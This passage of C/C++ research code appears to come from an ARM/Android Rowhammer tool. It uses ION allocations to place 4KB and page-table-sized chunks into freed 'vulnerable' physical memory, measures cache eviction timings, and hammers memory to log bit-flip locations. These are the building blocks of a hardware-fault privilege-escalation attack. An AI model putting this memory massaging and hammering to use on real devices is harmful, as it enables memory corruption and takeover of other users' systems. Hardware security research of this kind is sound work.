    /* Deallocate a 64KB chunk and immediately allocate 4K chunks */
    victim = 2; // for now, just a 'random' index to de-allocate 
    victim_vis = get_phys_addr((uintptr_t) vulnerable_64KB_chunks[victim].mapping);
    ion_clean(&vulnerable_64KB_chunks[victim]); // remove the 64KB chunk
    
    for (int i = 0; i < 64; i++) { 
        struct ion_data tmp;
        tmp.handle = ion_alloc(K4);
        if (tmp.handle == NULL) {
            /* out of memory, allocated all available contiguous 4M chunks */
            exit(EXIT_FAILURE);
        }
        tmp.fd = ion_share(tmp.handle);
        if (tmp.fd < 0) {
            perror("Could not share ion handle");
            exit(EXIT_FAILURE);
        }
        uint32_t addr = ((uint32_t) initmap) + ((i+1) * (64*4096));
        tmp.mapping = mmap((void *)addr, K4, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED, tmp.fd, 0);
        if (tmp.mapping == MAP_FAILED) {
            perror("Could not mmap");
            exit(EXIT_FAILURE);
        }
        tmp.len = K4;
        tmp.open = true;
        vulnerable_4KB_chunks.push_back(tmp);
    }
    ion_64KB_chunks.erase(ion_64KB_chunks.begin() + victim);

    /* find the vulnerable 4K pages */
    printf("[!] 64KB chunk was at physical address: %p\n", (void *) victim_vis);
    printf("[!] Checking whether 4K chunks have correct physical address...\n");
    correctly_mapped = 0; 
    index = 0;
    for (auto & chunk : vulnerable_4KB_chunks) {
        uint32_t vis = get_phys_addr((uintptr_t) chunk.mapping);
        if (vis >= victim_vis && vis <= victim_vis + K64 - 4096) {
            correctly_mapped++;
            printf("[!] ->   correct mapping: 4K at mva: %p | vis: %p -- !!!\n", chunk.mapping, (void *) vis);
        } else {
            printf("[!] -> incorrect mapping: 4K at mva: %p | vis: %p\n", chunk.mapping, (void *) vis);
        }
    }
    if (correctly_mapped != 64) {
        printf("[!] Not all 4K chunks mapped into deallocated 64KB chunk (only %d)\n", correctly_mapped);
    }

    return 0;

    victim = 10;

    uint32_t vis1 = get_phys_addr((uintptr_t) vulnerable_4KB_chunks[victim].mapping);
    uint32_t vis2 = get_phys_addr((uintptr_t) vulnerable_4KB_chunks[victim+1].mapping);
    
    ion_clean(&vulnerable_4KB_chunks[victim]);
    ion_clean(&vulnerable_4KB_chunks[victim+1]);
    ion_exhaust(K4, pt_chunks, 16, 0, false, true);
    ion_open_all(pt_chunks);

    printf("released vis: %p\n", (void *) vis1);
    printf("released vis: %p\n", (void *) vis2);
    for (auto & chunk : pt_chunks) {
        uint32_t vis = get_phys_addr((uintptr_t) chunk.mapping);
        printf("- 4K at vis: %p", (void *) vis);
        if (vis == vis1 || vis == vis2) printf(" - vulnerable");
        printf("\n");
    }



    exit(0); 

#else

    mapping_size = (uint64_t) ( (double) get_mem_size()) * MEM_FRACTION;
    mapping = mmap(NULL, mapping_size, PROT_READ | PROT_WRITE | PROT_EXEC,
                                             MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (mapping == MAP_FAILED) {
        perror("Could not mmap");
        exit(EXIT_FAILURE);
    }
#endif // ION


    printf("[!] Initializing large memory mapping...\n");
    for (uint64_t index = 0; index < mapping_size; index += 0x1000) {
      uint64_t *temporary = (uint64_t *) ((uint64_t)mapping + index);
      temporary[0] = index;
    }
    
    
    printf("[!] Initializing a reverse mapping...\n");
    for (uint64_t offset = 0; offset < mapping_size; offset += PAGESIZE) {
        uint64_t mva = (uint64_t) mapping + offset;
        uint64_t vis = get_phys_addr(mva);
        printf("- mva %p is at vis %p\n", (void *) (uint32_t) mva, (void *) (uint32_t) vis);
        reverse_mapping[vis] = mva;
    }
    
    /* both won't work on ION contiguous memory */
    //int ret = madvise((void *) ((uint64_t)mapping + 4096), 4096, MADV_DONTNEED);
    //int ret = munmap( (void *) ((uint64_t)mapping + 4096), 4096);


    uint32_t vis = find_contiguous_chunk(mapping, mapping_size);

#ifdef PLOT_CACHELINESIZE
    /* The difference between reading from L1 and L2 is very small. We run each 
     * two reads 5 times and pick the median of the average read speed. */
#define PLOT_CACHELINESIZE_LOOP 11
    printf("#   offset (bytes)    ns (median)    ns (mean)\n");
    for (int offset = 0; offset < 256; offset = offset + 1) {
        struct data_t user_data;
        user_data.f = (volatile VOID *) mapping;
        user_data.s = (volatile VOID *) (uint64_t) ((uint64_t)mapping + offset);
        user_data.count = M1;
        user_data.type = RHF_PAIR_SYNC;
        user_data.option1 = 4; /* sync 4 times in the hammer loop: after every instruction */
        uint32_t ns[PLOT_CACHELINESIZE_LOOP];
        for (int i = 0; i < PLOT_CACHELINESIZE_LOOP; i++) {
            ns[i] = ioctl(rh_fd, RH_IOC_HAMMER_FLUSH, &user_data);
        }

        printf("%18d %14u %12u\n", offset, median(PLOT_CACHELINESIZE_LOOP,ns), mean(PLOT_CACHELINESIZE_LOOP, ns));
    }
    return 0;
#endif

#ifdef PLOT_CACHE_SIZE

#ifdef PLOT_L1
    #define     CACHE_SIZE_STEP 8
    #define MAX_CACHE_SIZE (32 * 1024)
    #define CACHELINE_SIZE L1_CACHELINE_SIZE
    #define CACHE_SIZE_COUNT K8 
    #define CACHE_SIZE_LOOP 11
#endif
#if PLOT_L2
    #define     CACHE_SIZE_STEP 512
    #define MAX_CACHE_SIZE (4 * 1024 * 1024)
    #define CACHELINE_SIZE L2_CACHELINE_SIZE
    #define CACHE_SIZE_COUNT K4
    #define CACHE_SIZE_LOOP 7
#endif

    uint32_t vis = find_contiguous_chunk(mapping, mapping_size);
    uint32_t mva = reverse_mapping[vis];

    printf("#lines      ns (median)     ns (mean)     misses (per %d reads)\n", CACHE_SIZE_COUNT);
    for (int blocks = CACHE_SIZE_STEP; 
             blocks < (MAX_CACHE_SIZE / CACHELINE_SIZE);
             blocks = blocks + CACHE_SIZE_STEP) {

        uint32_t set[blocks];
        for (int i = 0; i < blocks; i++) {
            set[i] = mva + i*CACHELINE_SIZE;
        }
        volatile VOID **read_set = (volatile VOID **) set;
        uint64_t ns[CACHE_SIZE_LOOP];
        uint64_t perf[CACHE_SIZE_LOOP];

        for (int j = 0; j < CACHE_SIZE_LOOP; j++) {
            uint64_t counter = 0;
            uint32_t count = CACHE_SIZE_COUNT;

            ioctl(perf_fd, PERF_EVENT_IOC_RESET, 0);
            ioctl(perf_fd, PERF_EVENT_IOC_ENABLE, 0);
            uint64_t t1 = get_ns();
            while (count-- > 0) {
                for (int i = 0; i < blocks; i++) {
                    *read_set[i];
                    asm volatile("dsb ish");
                }
            }
            uint64_t t2 = get_ns();
            ioctl(perf_fd, PERF_EVENT_IOC_DISABLE, 0);
            if (read(perf_fd, &counter, sizeof(counter)) != sizeof(counter)) {
                 perror("Could not read performance counter");
                 exit(EXIT_FAILURE);
            }

            ns[j] = (uint64_t) ((t2 - t1) / (blocks * CACHE_SIZE_COUNT));
            perf[j] = (uint64_t) (counter / (blocks));
        }
        printf("%6d %16llu %13llu %27llu\n", blocks, 
                    median(CACHE_SIZE_LOOP,ns), 
                      mean(CACHE_SIZE_LOOP,ns),
                    median(CACHE_SIZE_LOOP,perf));
    }
    return 0;
#endif



#ifdef PLOT_SET_WAYS

#define MIN_WAYS 8
#define MAX_WAYS 8

#ifdef PLOT_L1
    #define CACHE_SIZE L1_CACHE_SIZE
    #define CACHELINE_SIZE L1_CACHELINE_SIZE
    #define SET_WAY_COUNT M1
    #define SET_WAY_LOOP 5
#endif
#if PLOT_L2
    #define CACHE_SIZE L2_CACHE_SIZE
    #define CACHELINE_SIZE L2_CACHELINE_SIZE
    #define SET_WAY_COUNT M1
    #define SET_WAY_LOOP 5
#endif

    uint32_t vis = find_contiguous_chunk(mapping, mapping_size);
    uint32_t mva = reverse_mapping[vis];

    printf("#sets   ways      reads     ns  (median/mean/min/max)     misses (per %d reads)\n", SET_WAY_COUNT);

    for (int ways = MIN_WAYS; ways <= MAX_WAYS; ways = ways*2) {        
        int sets = CACHE_SIZE / CACHELINE_SIZE / ways;

//        printf("ways: %d\n", ways);
//        printf("sets: %d\n", sets);

        uint32_t addresses[ways+1]; // ways + 1 reads should kick out one cacheline
        for (int i = 0; i < ways+1; i++) {
            addresses[i] = mva + CACHELINE_SIZE*sets*i;
//          printf("- address: %p (+%d)\n", (void*) addresses[i], sets*i );
        }
        volatile VOID **read_set = (volatile VOID **) addresses;
        uint64_t ns[SET_WAY_LOOP];
        uint64_t perf[SET_WAY_LOOP];

        for (int w = 0; w < ways+1; w++) {

            for (int j = 0; j < SET_WAY_LOOP; j++) {
                uint64_t counter = 0;
                uint32_t count = SET_WAY_COUNT;

                ioctl(perf_fd, PERF_EVENT_IOC_RESET, 0);
                ioctl(perf_fd, PERF_EVENT_IOC_ENABLE, 0);
                uint64_t t1 = get_ns();
               
                while (count-- > 0) {
                    for (int i = 0; i <= w; i++) {
//                      printf("- reading from read_set[%d]: %p\n", i, read_set[i]);
                        *read_set[i];
                        asm volatile("dsb ish");
                    }
                }
                uint64_t t2 = get_ns();
                ioctl(perf_fd, PERF_EVENT_IOC_DISABLE, 0);
                if (read(perf_fd, &counter, sizeof(counter)) != sizeof(counter)) {
                     perror("Could not read performance counter");
                     exit(EXIT_FAILURE);
                }
    
                ns[j] = (uint64_t) ((t2 - t1) / ((w+1) * SET_WAY_COUNT));
                perf[j] = (uint64_t) (counter / (w+1));
            }
            printf("%5d %6d %10d %5llu / %5llu / %5llu / %5llu %27llu\n", sets, ways, w+1,
                        median(SET_WAY_LOOP,ns), 
                          mean(SET_WAY_LOOP,ns),
                           min(SET_WAY_LOOP,ns),
                           max(SET_WAY_LOOP,ns),
                        median(SET_WAY_LOOP,perf));
        }
    }
    return 0;
#endif


#ifdef PLOT_EVICTION
    printf("[!] Starting eviction test..\n");



#define OFFSET_PAGES 4

    uint32_t vis = find_contiguous_chunk(mapping, mapping_size);

    uint32_t target_read_time;
    uint32_t  evict_read_time;

    /* figure out the time it takes to read from the slowest cache */

    printf("[!] Determining average time to read from the slowest cache...\n");
    uint64_t cache_read_times[OFFSET_PAGES];
    for (int offset_page = 0; offset_page < OFFSET_PAGES; offset_page++) {
        measure_evict_time(vis + offset_page * PAGESIZE, 1, 1, 1, L1_WAYS, &target_read_time, &evict_read_time);
        cache_read_times[offset_page] = target_read_time;
    }
    uint64_t cache_read_time = max(OFFSET_PAGES, cache_read_times);
    printf("[!] Cache read time seems to be %lluns\n", cache_read_time);

    printf("[!] Trying RowhammerJS eviction strategies...\n");
    for (int C = 1; C <= 1; C++) {
      for (int D = 1; D <= 5; D++) {
        for (int L = 1; L <= 4; L++)  {
          for (int S = 8; S <= 15; S++) {
            uint64_t  evict_read_times[OFFSET_PAGES];
            uint64_t target_read_times[OFFSET_PAGES];
            int evicted_count = 0;
            for (int offset_page = 0; offset_page < OFFSET_PAGES; offset_page++) {
              measure_evict_time(vis + offset_page * PAGESIZE, 
//                                      C, D, L, S, 
                                        1, 1, 1, 11,
                                    &target_read_time, &evict_read_time);
              evict_read_times[offset_page] =  evict_read_time;
              target_read_times[offset_page] = target_read_time;
              if (target_read_time > cache_read_time) evicted_count++;
            }
            uint32_t med_target_read_time = median(OFFSET_PAGES, target_read_times);
            uint32_t med_evict_read_time  = median(OFFSET_PAGES, evict_read_times);
            printf("   -> P -%2d -%2d -%2d -%2d | med(target_read_time): %u | med(evict_read_time): %4u | evicted: %2d / %2d",
                        C, D, L, S, med_target_read_time, med_evict_read_time, evicted_count, OFFSET_PAGES);
            if (evicted_count == OFFSET_PAGES) printf(" <-- \n");
            else printf("\n");
          }
        }
      }
    }

    return 0;

#endif 

#ifdef PERSIAN
    printf("[!] Starting random read thread...\n");
    pthread_t random_thread;
    if(pthread_create(&random_thread, NULL, seq_access, NULL)) {
        perror("Could not create ptread");
        exit(EXIT_FAILURE);
    }
#endif
   
#ifdef FIND_ROWSIZE
    printf("[!] Figuring out the row size...\n");
    uint64_t rowsize = rowsize_sidechannel(mapping, mapping_size);
    if (rowsize < 0) {
        printf("Unable to find the rowsize\n");
        exit(EXIT_FAILURE);
    }

    return 0;
#endif

   
    std::map<uint64_t, std::vector<uint8_t>> flip0_locations;
    std::map<uint64_t, std::vector<uint8_t>> flip1_locations;
    std::map<uint64_t, uint64_t> deltaflips;
    std::map<uint64_t, uint64_t> counterflips;

#ifdef BUSY_LOOP
    int start_row = 600;
    int  last_row = 700;
    for (int i = 0; i < 100; i = i + 5) {
        printf("[!] ### Starting busy loop test with %d iterations for rows %d to %d\n", i, start_row, last_row);
        sleep(30);
        find_bitflips(mapping, mapping_size, 
                flip0_locations, 
                flip1_locations, 
                deltaflips,
                counterflips, start_row, last_row, i, HC_BUSY, HC_BUSY_READCOUNT);

        printf("[!] Deltaflips:\n");
        for (auto & it : deltaflips) {
            printf("- %llu: %llu flips\n", it.first, it.second);
        }
        printf("[!] Counterflips:\n");
        for (auto & it : counterflips) {
            printf("- %llu: %llu flips\n", it.first, it.second);
        }
    }

    return 0;
#endif


    find_bitflips(mapping, mapping_size, 
            flip0_locations, 
            flip1_locations, 
            deltaflips,
//            counterflips, 600, 700, 0, DEFAULT_CONF, DEFAULT_COUNT);
            counterflips, 0, 0, 0, DEFAULT_CONF, DEFAULT_COUNT);

    for (auto & it : flip0_locations) {
        uint64_t vis = it.first;
        std::vector<uint8_t> templates = it.second;
        printf("flip 0 to 1 at physical address %p: %zu times ( ", (void *) vis, templates.size());
        for (auto & it2 : templates) {
            printf("0x%02x " , it2);
        }
      printf(")\n");
    }
    for (auto & it : flip1_locations) {
        uint64_t vis = it.first;
        std::vector<uint8_t> templates = it.second;
        printf("flip 1 to 0 at physical address %p: %zu times ( ", (void *) vis, templates.size());
        for (auto & it2 : templates) {
            printf("0x%02x ", it2);
        }
        printf(")\n");
    }


    close(perf_fd);

    return 0;
}
